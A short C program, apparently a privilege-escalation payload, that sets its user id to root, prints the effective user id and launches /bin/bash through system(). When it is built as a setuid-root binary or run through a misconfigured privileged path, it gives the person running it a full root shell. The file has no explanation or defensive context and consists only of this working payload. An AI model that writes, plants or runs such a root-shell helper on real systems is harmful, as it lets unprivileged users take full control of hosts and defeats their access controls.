#include <stdio.h>
#include <unistd.h>

int main(int argc, char** argv) {
    setuid(0);
    printf("%d", geteuid());
    system("/bin/bash");
    return 0;
}